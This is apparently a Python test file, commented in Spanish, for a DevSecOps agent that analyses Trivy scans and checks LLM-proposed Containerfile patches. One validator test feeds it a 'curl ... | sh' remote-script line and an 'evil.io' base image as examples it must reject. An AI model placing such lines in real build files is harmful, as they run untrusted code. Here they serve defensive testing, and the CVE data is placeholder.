"""Análisis con el modelo: hechos de la imagen, verificador y parche validado."""

from __future__ import annotations

import time

from devsecops_agents.remediation_agent import llm_analysis
from devsecops_agents.remediation_agent.analysis import analyze
from devsecops_agents.remediation_agent.facts import image_facts
from devsecops_agents.remediation_agent.server import RemediationAgent

CONTAINERFILE = (
    "FROM registry.access.redhat.com/ubi9/nginx-120:9.8\n"
    "COPY index.html /opt/app-root/src/\n"
    'CMD ["nginx", "-g", "daemon off;"]\n'
)
PATH = "sample-app/Containerfile"


def _pkg(name, deps=()):
    return {"Name": name, "DependsOn": [f"{d}@1.0.x86_64" for d in deps]}


TRIVY_IMAGE = {
    "ArtifactName": "zot/sample-app:1",
    "Metadata": {
        "OS": {"Family": "redhat", "Name": "9.8"},
        "ImageConfig": {"config": {"User": "1001"}},
    },
    "Results": [
        {
            "Target": "img (redhat 9.8)",
            "Class": "os-pkgs",
            "Packages": [
                _pkg("nginx", ["nginx-core", "systemd"]),
                _pkg("nginx-core", ["openssl-libs", "glibc"]),
                _pkg("nginx-mod-http-image-filter", ["nginx", "gd"]),
                _pkg("gd", ["libpng"]),
                _pkg("systemd", ["util-linux"]),
                _pkg("openssl-libs"),
                _pkg("libpng"),
                _pkg("util-linux"),
                _pkg("vim-minimal"),
                _pkg("glibc"),
            ],
            "Vulnerabilities": [
                {
                    "VulnerabilityID": "CVE-1",
                    "PkgName": "openssl-libs",
                    "Severity": "HIGH",
                    "InstalledVersion": "3.0",
                    "FixedVersion": "",
                    "Status": "affected",
                },
                {
                    "VulnerabilityID": "CVE-2",
                    "PkgName": "libpng",
                    "Severity": "HIGH",
                    "InstalledVersion": "1.6",
                    "FixedVersion": "1.7",
                    "Status": "fixed",
                },
                {
                    "VulnerabilityID": "CVE-3",
                    "PkgName": "vim-minimal",
                    "Severity": "HIGH",
                    "InstalledVersion": "8.2",
                    "FixedVersion": "",
                    "Status": "will_not_fix",
                },
                {
                    "VulnerabilityID": "CVE-4",
                    "PkgName": "util-linux",
                    "Severity": "HIGH",
                    "InstalledVersion": "2.37",
                    "FixedVersion": "",
                    "Status": "affected",
                },
            ],
        }
    ],
}
TRIVY_FS = {
    "Results": [
        {
            "Target": "Containerfile",
            "Class": "config",
            "Misconfigurations": [
                {
                    "AVDID": "AVD-DS-0002",
                    "Title": "Image user should not be 'root'",
                    "Message": "Specify at least 1 USER",
                    "Severity": "HIGH",
                }
            ],
        }
    ]
}
VULNERABLE = ["openssl-libs", "libpng", "vim-minimal", "util-linux"]


def _facts():
    return image_facts([TRIVY_FS, TRIVY_IMAGE], CONTAINERFILE, VULNERABLE)


def _analysis():
    return analyze([TRIVY_FS, TRIVY_IMAGE], CONTAINERFILE, containerfile_path=PATH, facts=_facts())


def test_facts_know_who_runs_and_what_it_loads():
    f = _facts()
    assert f["user"] == "1001" and f["user_source"] == "imagen base" and not f["runs_as_root"]
    assert f["command"] == "nginx" and f["main_packages"] == ["nginx-core"]
    use = {p: u["runtime"] for p, u in f["package_usage"].items()}
    # systemd lo pide la instalación del paquete nginx, no el binario: no cuenta.
    assert use == {
        "openssl-libs": "carga-directa",
        "libpng": "modulo-opcional",
        "vim-minimal": "no-lo-usa",
        "util-linux": "no-lo-usa",
    }


def test_rules_downgrade_root_finding_when_base_sets_user():
    root = next(
        r
        for r in _analysis().recommendations
        if r.guideline_entity == "pod-101-require-run-as-nonroot"
    )
    assert root.severity == "LOW" and "ya define USER 1001" in root.detail


GOOD = (
    "FROM registry.access.redhat.com/ubi9/nginx-120:9.8\n"
    "USER 0\nRUN dnf remove -y vim-minimal && dnf clean all\nUSER 1001\n"
    "COPY index.html /opt/app-root/src/\n"
    'CMD ["nginx", "-g", "daemon off;"]\n'
)


def test_validator_accepts_a_safe_patch():
    ok, reasons = llm_analysis.validate_containerfile(CONTAINERFILE, GOOD, _facts())
    assert ok, reasons


def test_validator_rejects_dangerous_or_invented_changes():
    facts = _facts()
    cases = {
        "root": GOOD.replace("USER 1001\n", ""),
        "inventado": GOOD.replace("nginx-120:9.8", "nginx-120:9.8@sha256:" + "a" * 64),
        "permitida": GOOD.replace("registry.access.redhat.com/ubi9/nginx-120:9.8", "evil.io/x:1"),
        "script": GOOD.replace("dnf clean all", "curl -s http://x/i.sh | sh"),
        "cambia la app": GOOD.replace("COPY index.html", "COPY other.html"),
    }
    for expected, proposed in cases.items():
        ok, reasons = llm_analysis.validate_containerfile(CONTAINERFILE, proposed, facts)
        assert not ok and any(expected in r for r in reasons), (expected, reasons)


def test_verifier_corrects_the_model_and_records_why():
    raw = {
        "overview": "Riesgo real: openssl-libs, que nginx carga.",
        "findings": [{"id": "AVD-DS-0002", "verdict": "real", "reason": "corre como root"}],
        "packages": [
            {"package": "openssl-libs", "risk": "alto", "reason": "TLS", "action": "actualizar"},
            {"package": "inventado", "risk": "alto", "reason": "x", "action": "quitar"},
        ],
        "priorities": [
            {
                "title": "Quitar vim",
                "why": "no se usa",
                "action": "dnf remove",
                "findings": ["vim-minimal", "CVE-999"],
                "applies_patch": True,
            },
            {
                "title": "Fantasma",
                "why": "x",
                "action": "x",
                "findings": ["CVE-404"],
                "applies_patch": False,
            },
        ],
        "proposed_containerfile": GOOD,
        "patch_explanation": "Quita vim.",
    }
    v = llm_analysis.verify(raw, _analysis(), _facts(), CONTAINERFILE)
    c = " ".join(v["corrections"])
    assert v["findings"][0]["verdict"] == "defensa-en-profundidad"  # la base ya fija 1001
    pk = {p["package"]: p for p in v["packages"]}
    assert pk["openssl-libs"]["action"] == "cambiar-base"  # sin versión que lo corrija
    assert "inventado" not in pk and pk["util-linux"]["source"] == "reglas"
    assert [p["title"] for p in v["priorities"]] == ["Quitar vim"]
    assert v["priorities"][0]["findings"] == ["vim-minimal"]
    assert "CVE-999" in c and "Fantasma" in c and "inventado" in c
    assert v["patch"]["status"] == "accepted"
    recs = llm_analysis.to_recommendations(v, _analysis())
    assert recs[0].fix.diff and "dnf remove" in recs[0].fix.diff


class FakeStructured:
    def __init__(self, out):
        self.out = out

    def invoke(self, _msgs):
        return self.out


class FakeModel:
    def __init__(self, out):
        self.out = out

    def with_structured_output(self, schema, method):
        assert schema["title"] and method == "json_schema"
        return FakeStructured(self.out)


class Guidelines:
    def get(self, name):
        return None


class Policies:
    def get(self, name):
        return None


def test_advise_answers_fast_then_publishes_the_model_analysis(monkeypatch):
    out = {
        "overview": "nginx carga openssl-libs sin parche: es lo único que importa en ejecución.",
        "findings": [{"id": "AVD-DS-0002", "verdict": "falso-positivo", "reason": "USER 1001"}],
        "packages": [],
        "priorities": [
            {
                "title": "Quitar vim",
                "why": "no se usa",
                "action": "dnf remove",
                "findings": ["vim-minimal"],
                "applies_patch": True,
            }
        ],
        "proposed_containerfile": GOOD,
        "patch_explanation": "Quita vim.",
    }
    monkeypatch.setenv("LLM_PROVIDER", "openai-compatible")
    monkeypatch.setattr(llm_analysis.llm, "build_chat_model", lambda **kw: FakeModel(out))
    agent = RemediationAgent(guidelines=Guidelines(), policies=Policies())
    report = agent.advise(
        {
            "trivy": [TRIVY_FS, TRIVY_IMAGE],
            "containerfile": CONTAINERFILE,
            "containerfile_path": PATH,
        }
    )
    assert report["engine"] == "rules" and report["analysis_status"] == "pending"
    for _ in range(50):
        if agent.state.report["analysis_status"] != "pending":
            break
        time.sleep(0.05)
    final = agent.state.report
    assert final["engine"] == "llm" and final["analysis_status"] == "done"
    assert final["explanation"].startswith("nginx carga openssl-libs")
    assert final["recommendations"][0]["fix"]["diff"]
    assert final["llm"]["patch"]["status"] == "accepted"
    assert "patched" not in final["llm"]["patch"]
    # La acción que se prepara aplica el Containerfile del modelo, ya validado.
    assert "dnf remove" in agent.state.analysis.recommendations[0].fix.patched
